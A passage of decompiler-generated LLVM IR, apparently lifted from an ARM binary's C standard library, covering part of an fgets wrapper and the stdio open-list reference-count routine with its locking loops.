  %v0_15d80 = load i32, i32* @r7, align 4
  %v1_15d80 = add i32 %v0_15d80, 60
  %v2_15d80 = inttoptr i32 %v1_15d80 to i32*
  %v3_15d80 = load i32, i32* %v2_15d80, align 4
  %v1_15d84 = add i32 %v3_15d80, 1
  store i32 %v1_15d84, i32* %r3.global-to-local, align 4
  store i32 %v1_15d84, i32* %v2_15d80, align 4
  %v0_15d8c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_15d90.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_15d94.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15d8c

dec_label_pc_15d8c:                               ; preds = %entry, %dec_label_pc_15d80
  %v0_15d94 = phi i32 [ %arg3, %entry ], [ %v0_15d94.pre, %dec_label_pc_15d80 ]
  %v0_15d90 = phi i32 [ %arg2, %entry ], [ %v0_15d90.pre, %dec_label_pc_15d80 ]
  %v0_15d8c = phi i32 [ %arg1, %entry ], [ %v0_15d8c.pre, %dec_label_pc_15d80 ]
  store i32 %v0_15d90, i32* %r1.global-to-local, align 4
  store i32 %v0_15d94, i32* %r2.global-to-local, align 4
  %v3_15d98 = inttoptr i32 %v0_15d8c to i8*
  %v4_15d98 = call i32 @__GI_fgets_unlocked(i8* %v3_15d98, i32 %v0_15d90, i32 %v0_15d94)
  %v0_15d9c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d9c = icmp eq i32 %v0_15d9c, 0
  store i32 %v4_15d98, i32* %r8.global-to-local, align 4
  br i1 %v2_15d9c, label %dec_label_pc_15da8, label %dec_label_pc_15e1c

dec_label_pc_15da8:                               ; preds = %dec_label_pc_15d8c
  %v0_15da8 = load i32, i32* @r7, align 4
  %v1_15da8 = add i32 %v0_15da8, 60
  %v2_15da8 = inttoptr i32 %v1_15da8 to i32*
  %v3_15da8 = load i32, i32* %v2_15da8, align 4
  %v1_15dac = add i32 %v3_15da8, -1
  store i32 %v1_15dac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15db0 = icmp eq i32 %v1_15dac, 0
  store i32 %v1_15dac, i32* %v2_15da8, align 4
  br i1 %v2_15db0, label %dec_label_pc_15dbc, label %dec_label_pc_15e1c

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15da8
  %v0_15dbc = load i32, i32* %r3.global-to-local, align 4
  %v1_15dbc = load i32, i32* @r7, align 4
  %v2_15dbc = add i32 %v1_15dbc, 64
  %v3_15dbc = inttoptr i32 %v2_15dbc to i32*
  store i32 %v0_15dbc, i32* %v3_15dbc, align 4
  %v0_15dc0 = load i32, i32* @r7, align 4
  %v1_15dc0 = add i32 %v0_15dc0, 56
  store i32 %v1_15dc0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15dc4

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15df4.dec_label_pc_15dc4_crit_edge, %dec_label_pc_15dbc
  %v0_15dcc = phi i32 [ %v0_15dcc.pre, %dec_label_pc_15df4.dec_label_pc_15dc4_crit_edge ], [ %v1_15dc0, %dec_label_pc_15dbc ]
  %v0_15dc4 = phi i32 [ %v0_15dc4.pre, %dec_label_pc_15df4.dec_label_pc_15dc4_crit_edge ], [ %v0_15dc0, %dec_label_pc_15dbc ]
  %v1_15dc4 = add i32 %v0_15dc4, 56
  %v2_15dc4 = inttoptr i32 %v1_15dc4 to i32*
  %v3_15dc4 = load i32, i32* %v2_15dc4, align 4
  store i32 %v3_15dc4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15dcc, i32* %r2.global-to-local, align 4
  %v1_15dd024 = inttoptr i32 %v0_15dcc to i32*
  %v2_15dd025 = load i32, i32* %v1_15dd024, align 4
  store i32 %v2_15dd025, i32* %r3.global-to-local, align 4
  %v3_15dd427 = icmp uge i32 %v2_15dd025, %v3_15dc4
  store i1 %v3_15dd427, i1* %cpsr_c.global-to-local, align 1
  %v9_15dd433 = icmp eq i32 %v2_15dd025, %v3_15dc4
  br i1 %v9_15dd433, label %dec_label_pc_15ddc, label %dec_label_pc_15df4

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15dc4, %dec_label_pc_15ddc.dec_label_pc_15dd0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15dec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15dec, label %dec_label_pc_15df0, label %dec_label_pc_15ddc.dec_label_pc_15dd0_crit_edge

dec_label_pc_15ddc.dec_label_pc_15dd0_crit_edge:  ; preds = %dec_label_pc_15ddc
  %v0_15dd0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15dd4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15dd0 = inttoptr i32 %v0_15dd0.pre to i32*
  %v2_15dd0 = load i32, i32* %v1_15dd0, align 4
  store i32 %v2_15dd0, i32* %r3.global-to-local, align 4
  %v3_15dd4 = icmp uge i32 %v2_15dd0, %v1_15dd4.pre
  store i1 %v3_15dd4, i1* %cpsr_c.global-to-local, align 1
  %v9_15dd4 = icmp eq i32 %v2_15dd0, %v1_15dd4.pre
  br i1 %v9_15dd4, label %dec_label_pc_15ddc, label %dec_label_pc_15df4

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15ddc
  %v0_15df0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15df0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15df4

dec_label_pc_15df4:                               ; preds = %dec_label_pc_15dc4, %dec_label_pc_15ddc.dec_label_pc_15dd0_crit_edge, %dec_label_pc_15df0
  %v0_15dfc = phi i32 [ %v0_15df0, %dec_label_pc_15df0 ], [ %v2_15dd025, %dec_label_pc_15dc4 ], [ %v2_15dd0, %dec_label_pc_15ddc.dec_label_pc_15dd0_crit_edge ]
  %v1_15df4 = phi i32 [ %v0_15df0, %dec_label_pc_15df0 ], [ %v3_15dc4, %dec_label_pc_15dc4 ], [ %v1_15dd4.pre, %dec_label_pc_15ddc.dec_label_pc_15dd0_crit_edge ]
  %v3_15df4 = icmp uge i32 %v0_15dfc, %v1_15df4
  store i1 %v3_15df4, i1* %cpsr_c.global-to-local, align 1
  %v9_15df4 = icmp eq i32 %v0_15dfc, %v1_15df4
  br i1 %v9_15df4, label %dec_label_pc_15dfc, label %dec_label_pc_15df4.dec_label_pc_15dc4_crit_edge

dec_label_pc_15df4.dec_label_pc_15dc4_crit_edge:  ; preds = %dec_label_pc_15df4
  %v0_15dc4.pre = load i32, i32* @r7, align 4
  %v0_15dcc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15dc4

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15df4
  %v2_15dfc = icmp ne i32 %v1_15df4, 0
  store i1 %v2_15dfc, i1* %cpsr_c.global-to-local, align 1
  %v7_15e00 = icmp slt i32 %v1_15df4, 2
  br i1 %v7_15e00, label %dec_label_pc_15e1c, label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15dfc
  %v0_15e08 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e08 = add i32 %v0_15e08, 129
  store i32 %v1_15e08, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15e1c

dec_label_pc_15e1c:                               ; preds = %dec_label_pc_15da8, %dec_label_pc_15d8c, %dec_label_pc_15e04, %dec_label_pc_15dfc
  %v0_15e1c = load i32, i32* %r8.global-to-local, align 4
  %v2_15e20 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_15e20, i32* %r4.global-to-local, align 4
  store i32 %v6_15d0c, i32* @r5, align 4
  store i32 %v9_15d0c, i32* @r6, align 4
  store i32 %v12_15d0c, i32* @r7, align 4
  store i32 %v15_15d0c, i32* @r8, align 4
  store i32 %v24_15d0c, i32* @lr, align 4
  ret i32 %v0_15e1c

; uselistorder directives
  uselistorder i32 %v0_15df0, { 1, 0, 2 }
  uselistorder i32 %v1_15dd4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_15d90, { 1, 0 }
  uselistorder i32 %v0_15d94, { 1, 0 }
  uselistorder i32 %v1_15d50.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 11, 12, 9, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_15e1c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15df4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ddc, { 1, 0 }
  uselistorder label %dec_label_pc_15d8c, { 1, 0 }
  uselistorder label %dec_label_pc_15d80, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_15d70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d58, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15e28 = load i32, i32* @r4, align 4
  store i32 %v3_15e28, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r5.global-to-local, align 4
  %v4_15e38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 160) to i32*), align 4
  store i32 %v4_15e38, i32* %r7.global-to-local, align 4
  %v0_15e3c = call i32 @__aeabi_read_tp()
  store i32 %v0_15e3c, i32* %r0.global-to-local, align 4
  %v1_15e40 = add i32 %v4_15e38, 8
  %v2_15e40 = inttoptr i32 %v1_15e40 to i32*
  %v3_15e40 = load i32, i32* %v2_15e40, align 4
  store i32 %v3_15e40, i32* %r3.global-to-local, align 4
  %v1_15e44 = add i32 %v0_15e3c, -1168
  store i32 %v1_15e44, i32* %r6.global-to-local, align 4
  %v3_15e48 = icmp uge i32 %v3_15e40, %v1_15e44
  store i1 %v3_15e48, i1* %cpsr_c.global-to-local, align 1
  %v9_15e48 = icmp eq i32 %v3_15e40, %v1_15e44
  br i1 %v9_15e48, label %dec_label_pc_15e94, label %dec_label_pc_15e54

dec_label_pc_15e54:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15e38, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15e6093 = inttoptr i32 %v4_15e38 to i32*
  %v2_15e6094 = load i32, i32* %v1_15e6093, align 4
  store i32 %v2_15e6094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15e6496 = icmp eq i32 %v2_15e6094, 0
  br i1 %v9_15e6496, label %dec_label_pc_15e6c, label %dec_label_pc_15e84

dec_label_pc_15e6c:                               ; preds = %dec_label_pc_15e54, %dec_label_pc_15e6c.dec_label_pc_15e60_crit_edge
  %v0_15e6c97 = phi i32 [ %v1_15e64.pre, %dec_label_pc_15e6c.dec_label_pc_15e60_crit_edge ], [ 0, %dec_label_pc_15e54 ]
  store i32 %v0_15e6c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15e7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15e7c, label %dec_label_pc_15e80, label %dec_label_pc_15e6c.dec_label_pc_15e60_crit_edge

dec_label_pc_15e6c.dec_label_pc_15e60_crit_edge:  ; preds = %dec_label_pc_15e6c
  %v0_15e60.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15e64.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15e60 = inttoptr i32 %v0_15e60.pre to i32*
  %v2_15e60 = load i32, i32* %v1_15e60, align 4
  store i32 %v2_15e60, i32* %r3.global-to-local, align 4
  %v3_15e64 = icmp uge i32 %v2_15e60, %v1_15e64.pre
  store i1 %v3_15e64, i1* %cpsr_c.global-to-local, align 1
  %v9_15e64 = icmp eq i32 %v2_15e60, %v1_15e64.pre
  br i1 %v9_15e64, label %dec_label_pc_15e6c, label %dec_label_pc_15e84

dec_label_pc_15e80:                               ; preds = %dec_label_pc_15e6c
  %v0_15e80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15e80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15e84

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e54, %dec_label_pc_15e6c.dec_label_pc_15e60_crit_edge, %dec_label_pc_15e80
  %v0_15e84 = phi i32 [ %v0_15e80, %dec_label_pc_15e80 ], [ %v2_15e6094, %dec_label_pc_15e54 ], [ %v2_15e60, %dec_label_pc_15e6c.dec_label_pc_15e60_crit_edge ]
  %v1_15e84 = phi i32 [ %v0_15e80, %dec_label_pc_15e80 ], [ 0, %dec_label_pc_15e54 ], [ %v1_15e64.pre, %dec_label_pc_15e6c.dec_label_pc_15e60_crit_edge ]
  %v3_15e84 = icmp uge i32 %v0_15e84, %v1_15e84
  store i1 %v3_15e84, i1* %cpsr_c.global-to-local, align 1
  %v9_15e84 = icmp eq i32 %v0_15e84, %v1_15e84
  br i1 %v9_15e84, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_15e84
  %v1_15e88 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15e88, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_15e84, %bb
  %v1_15e8c = xor i1 %v9_15e84, true
  call void @__pseudo_cond_branch(i1 %v1_15e8c, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_15e90 = load i32, i32* %r6.global-to-local, align 4
  %v1_15e90 = load i32, i32* %r7.global-to-local, align 4
  %v2_15e90 = add i32 %v1_15e90, 8
  %v3_15e90 = inttoptr i32 %v2_15e90 to i32*
  store i32 %v0_15e90, i32* %v3_15e90, align 4
  br label %dec_label_pc_15e94

dec_label_pc_15e94:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15e98 = load i32, i32* %r5.global-to-local, align 4
  %v2_15e98 = add i32 %v0_15e98, 160
  %v3_15e98 = inttoptr i32 %v2_15e98 to i32*
  %v4_15e98 = load i32, i32* %v3_15e98, align 4
  store i32 %v4_15e98, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15ea0 = add i32 %v0_15e98, 12
  %v3_15ea0 = inttoptr i32 %v2_15ea0 to i32*
  %v4_15ea0 = load i32, i32* %v3_15ea0, align 4
  store i32 %v4_15ea0, i32* %r3.global-to-local, align 4
  %v1_15ea4 = inttoptr i32 %v4_15ea0 to i32*
  %v2_15ea4 = load i32, i32* %v1_15ea4, align 4
  store i32 %v2_15ea4, i32* %r1.global-to-local, align 4
  %v1_15ea8 = add i32 %v4_15e98, 4
  %v2_15ea8 = inttoptr i32 %v1_15ea8 to i32*
  %v3_15ea8 = load i32, i32* %v2_15ea8, align 4
  %v2_15eac = icmp ne i32 %v2_15ea4, 0
  store i1 %v2_15eac, i1* %cpsr_c.global-to-local, align 1
  %v7_15eac = icmp eq i32 %v2_15ea4, 1
  %v1_15eb0 = add i32 %v3_15ea8, 1
  store i32 %v1_15eb0, i32* %r3.global-to-local, align 4
  store i32 %v1_15eb0, i32* %v2_15ea8, align 4
  br i1 %v7_15eac, label %dec_label_pc_15ebc, label %dec_label_pc_16020

dec_label_pc_15ebc:                               ; preds = %dec_label_pc_15e94
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_15ec0 = load i32, i32* %r5.global-to-local, align 4
  %v2_15ec0 = add i32 %v0_15ec0, 80
  %v3_15ec0 = inttoptr i32 %v2_15ec0 to i32*
  %v4_15ec0 = load i32, i32* %v3_15ec0, align 4
  store i32 %v4_15ec0, i32* %r3.global-to-local, align 4
  %v1_15ec4 = inttoptr i32 %v4_15ec0 to i32*
  %v2_15ec4 = load i32, i32* %v1_15ec4, align 4
  store i32 %v2_15ec4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_15ec4, 1
  br i1 %tmp46, label %dec_label_pc_16020, label %dec_label_pc_15ed0

dec_label_pc_15ed0:                               ; preds = %dec_label_pc_15ebc
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15ed4 = add i32 %v0_15ec0, 152
  %v3_15ed4 = inttoptr i32 %v2_15ed4 to i32*
  %v4_15ed4 = load i32, i32* %v3_15ed4, align 4
  store i32 %v4_15ed4, i32* %r7.global-to-local, align 4
  %v1_15ed8 = add i32 %v4_15ed4, 8
  %v2_15ed8 = inttoptr i32 %v1_15ed8 to i32*
  %v3_15ed8 = load i32, i32* %v2_15ed8, align 4
  store i32 %v3_15ed8, i32* %r3.global-to-local, align 4
  %v1_15edc = load i32, i32* %r6.global-to-local, align 4
  %v3_15edc = icmp uge i32 %v3_15ed8, %v1_15edc
  store i1 %v3_15edc, i1* %cpsr_c.global-to-local, align 1
  %v9_15edc = icmp eq i32 %v3_15ed8, %v1_15edc
  br i1 %v9_15edc, label %dec_label_pc_15f20, label %dec_label_pc_15ee4

dec_label_pc_15ee4:                               ; preds = %dec_label_pc_15ed0
  store i32 %v4_15ed4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15eec86 = inttoptr i32 %v4_15ed4 to i32*
  %v2_15eec87 = load i32, i32* %v1_15eec86, align 4
  store i32 %v2_15eec87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15ef089 = icmp eq i32 %v2_15eec87, 0
  br i1 %v9_15ef089, label %dec_label_pc_15ef8, label %dec_label_pc_15f10

dec_label_pc_15ef8:                               ; preds = %dec_label_pc_15ee4, %dec_label_pc_15ef8.dec_label_pc_15eec_crit_edge
  %v0_15ef890 = phi i32 [ %v1_15ef0.pre, %dec_label_pc_15ef8.dec_label_pc_15eec_crit_edge ], [ 0, %dec_label_pc_15ee4 ]
  store i32 %v0_15ef890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f08 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f08, label %dec_label_pc_15f0c, label %dec_label_pc_15ef8.dec_label_pc_15eec_crit_edge

dec_label_pc_15ef8.dec_label_pc_15eec_crit_edge:  ; preds = %dec_label_pc_15ef8
  %v0_15eec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15ef0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15eec = inttoptr i32 %v0_15eec.pre to i32*
  %v2_15eec = load i32, i32* %v1_15eec, align 4
  store i32 %v2_15eec, i32* %r3.global-to-local, align 4
  %v3_15ef0 = icmp uge i32 %v2_15eec, %v1_15ef0.pre
  store i1 %v3_15ef0, i1* %cpsr_c.global-to-local, align 1
  %v9_15ef0 = icmp eq i32 %v2_15eec, %v1_15ef0.pre
  br i1 %v9_15ef0, label %dec_label_pc_15ef8, label %dec_label_pc_15f10

dec_label_pc_15f0c:                               ; preds = %dec_label_pc_15ef8
  %v0_15f0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15ee4, %dec_label_pc_15ef8.dec_label_pc_15eec_crit_edge, %dec_label_pc_15f0c
  %v0_15f10 = phi i32 [ %v0_15f0c, %dec_label_pc_15f0c ], [ %v2_15eec87, %dec_label_pc_15ee4 ], [ %v2_15eec, %dec_label_pc_15ef8.dec_label_pc_15eec_crit_edge ]
  %v1_15f10 = phi i32 [ %v0_15f0c, %dec_label_pc_15f0c ], [ 0, %dec_label_pc_15ee4 ], [ %v1_15ef0.pre, %dec_label_pc_15ef8.dec_label_pc_15eec_crit_edge ]
  %v3_15f10 = icmp uge i32 %v0_15f10, %v1_15f10
  store i1 %v3_15f10, i1* %cpsr_c.global-to-local, align 1
  %v9_15f10 = icmp eq i32 %v0_15f10, %v1_15f10
  br i1 %v9_15f10, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_15f10
  %v1_15f14 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15f14, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_15f10, %bb47
  %v1_15f18 = xor i1 %v9_15f10, true
  call void @__pseudo_cond_branch(i1 %v1_15f18, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_15f1c = load i32, i32* %r6.global-to-local, align 4
  %v1_15f1c = load i32, i32* %r7.global-to-local, align 4
  %v2_15f1c = add i32 %v1_15f1c, 8
  %v3_15f1c = inttoptr i32 %v2_15f1c to i32*
  store i32 %v0_15f1c, i32* %v3_15f1c, align 4
  %v0_15f28.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15f20

dec_label_pc_15f20:                               ; preds = %dec_label_pc_15ed0, %bb48
  %v0_15f28 = phi i32 [ %v0_15ec0, %dec_label_pc_15ed0 ], [ %v0_15f28.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_15f28 = add i32 %v0_15f28, 152
  %v3_15f28 = inttoptr i32 %v2_15f28 to i32*
  %v4_15f28 = load i32, i32* %v3_15f28, align 4
  store i32 %v4_15f28, i32* %r0.global-to-local, align 4
  %v2_15f2c = add i32 %v0_15f28, 76
  %v3_15f2c = inttoptr i32 %v2_15f2c to i32*
  %v4_15f2c = load i32, i32* %v3_15f2c, align 4
  store i32 %v4_15f2c, i32* %r2.global-to-local, align 4
  %v1_15f30 = add i32 %v4_15f28, 4
  %v2_15f30 = inttoptr i32 %v1_15f30 to i32*
  %v3_15f30 = load i32, i32* %v2_15f30, align 4
  store i32 %v3_15f30, i32* %r3.global-to-local, align 4
  %v1_15f34 = inttoptr i32 %v4_15f2c to i32*
  %v2_15f34 = load i32, i32* %v1_15f34, align 4
  store i32 %v2_15f34, i32* %r2.global-to-local, align 4
  %v1_15f38 = add i32 %v3_15f30, 1
  store i32 %v1_15f38, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_15f38, i32* %v2_15f30, align 4
  %v0_15f88.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f8811 = icmp eq i32 %v0_15f88.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_15f8811, label %dec_label_pc_15f94, label %dec_label_pc_15f4c

dec_label_pc_15f4c:                               ; preds = %dec_label_pc_15f20, %dec_label_pc_15f84
  %v0_15f702 = phi i32 [ %v0_15f84, %dec_label_pc_15f84 ], [ %v0_15f88.pr, %dec_label_pc_15f20 ]
  %v1_15f4c = inttoptr i32 %v0_15f702 to i16*
  %v2_15f4c = load i16, i16* %v1_15f4c, align 2
  %v3_15f4c = zext i16 %v2_15f4c to i32
  store i32 %v3_15f4c, i32* %r3.global-to-local, align 4
  %v2_15f50 = and i32 %v3_15f4c, 32816
  store i32 %v2_15f50, i32* %r1.global-to-local, align 4
  %v2_15f54 = icmp ugt i32 %v2_15f50, 47
  store i1 %v2_15f54, i1* %cpsr_c.global-to-local, align 1
  %v7_15f54 = icmp eq i32 %v2_15f50, 48
  %v1_15f58 = add i32 %v0_15f702, 32
  %v2_15f58 = inttoptr i32 %v1_15f58 to i32*
  %v3_15f58 = load i32, i32* %v2_15f58, align 4
  store i32 %v3_15f58, i32* %r4.global-to-local, align 4
  br i1 %v7_15f54, label %dec_label_pc_15f64, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_15f4c
  store i32 %v0_15f702, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15f84

dec_label_pc_15f64:                               ; preds = %dec_label_pc_15f4c
  %v0_15f64 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f64 = icmp eq i32 %v0_15f64, 0
  br i1 %v2_15f64, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_15f64
  %v1_15f68 = load i32, i32* %r5.global-to-local, align 4
  %v2_15f68 = load i32, i32* %r7.global-to-local, align 4
  %v3_15f68 = add i32 %v2_15f68, %v1_15f68
  %v4_15f68 = inttoptr i32 %v3_15f68 to i32*
  %v5_15f68 = load i32, i32* %v4_15f68, align 4
  store i32 %v5_15f68, i32* %r3.global-to-local, align 4
  %v3_15f6c = inttoptr i32 %v5_15f68 to i32*
  store i32 %v3_15f58, i32* %v3_15f6c, align 4
  %v0_15f70 = load i32, i32* %r2.global-to-local, align 4
  %v1_15f70 = inttoptr i32 %v0_15f70 to i16*
  %v2_15f70 = load i16, i16* %v1_15f70, align 2
  %v3_15f70 = zext i16 %v2_15f70 to i32
  store i32 %v3_15f70, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_15f64
  %v2_15f708 = load i16, i16* %v1_15f4c, align 2
  %v3_15f709 = zext i16 %v2_15f708 to i32
  store i32 %v3_15f709, i32* %r3.global-to-local, align 4
  %v3_15f74 = add i32 %v0_15f64, 32
  %v4_15f74 = inttoptr i32 %v3_15f74 to i32*
  store i32 %v3_15f58, i32* %v4_15f74, align 4
  %v0_15f78.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_15f78 = phi i32 [ %v3_15f70, %.thread ], [ %v0_15f78.pre, %bb49 ]
  %v1_15f78 = and i32 %v0_15f78, 8192
  %v2_15f78 = icmp eq i32 %v1_15f78, 0
  br i1 %v2_15f78, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_15f7c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_15f7c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_15f80 = xor i1 %v2_15f78, true
  call void @__pseudo_cond_branch(i1 %v1_15f80, i32 ptrtoint (i32* @global_var_12874.33 to i32))
  %v0_15f84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15f84

dec_label_pc_15f84:                               ; preds = %.thread38, %bb52
  %v0_15f84 = phi i32 [ %v0_15f84.pre, %bb52 ], [ %v3_15f58, %.thread38 ]
  store i32 %v0_15f84, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f88 = icmp eq i32 %v0_15f84, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_15f88, label %dec_label_pc_15f94, label %dec_label_pc_15f4c

dec_label_pc_15f94:                               ; preds = %dec_label_pc_15f84, %dec_label_pc_15f20
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15f98 = load i32, i32* %r5.global-to-local, align 4
  %v2_15f98 = add i32 %v0_15f98, 152
  %v3_15f98 = inttoptr i32 %v2_15f98 to i32*
  %v4_15f98 = load i32, i32* %v3_15f98, align 4
  store i32 %v4_15f98, i32* %r0.global-to-local, align 4
  %v1_15f9c = add i32 %v4_15f98, 4
  %v2_15f9c = inttoptr i32 %v1_15f9c to i32*
  %v3_15f9c = load i32, i32* %v2_15f9c, align 4
  %v1_15fa0 = add i32 %v3_15f9c, -1
  store i32 %v1_15fa0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fa4 = icmp eq i32 %v1_15fa0, 0
  store i32 %v1_15fa0, i32* %v2_15f9c, align 4
  br i1 %v2_15fa4, label %dec_label_pc_15fb0, label %dec_label_pc_16010

dec_label_pc_15fb0:                               ; preds = %dec_label_pc_15f94
  %v0_15fb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_15fb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_15fb0 = add i32 %v1_15fb0, 8
  %v3_15fb0 = inttoptr i32 %v2_15fb0 to i32*
  store i32 %v0_15fb0, i32* %v3_15fb0, align 4
  %v0_15fb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15fb4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15fb8

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15fe8.dec_label_pc_15fb8_crit_edge, %dec_label_pc_15fb0
  %v0_15fb8 = phi i32 [ %v0_15fb8.pre, %dec_label_pc_15fe8.dec_label_pc_15fb8_crit_edge ], [ %v0_15fb4, %dec_label_pc_15fb0 ]
  %v1_15fb8 = inttoptr i32 %v0_15fb8 to i32*
  %v2_15fb8 = load i32, i32* %v1_15fb8, align 4
  store i32 %v2_15fb8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15fb8, i32* %r2.global-to-local, align 4
  %v2_15fc474 = load i32, i32* %v1_15fb8, align 4
  store i32 %v2_15fc474, i32* %r3.global-to-local, align 4
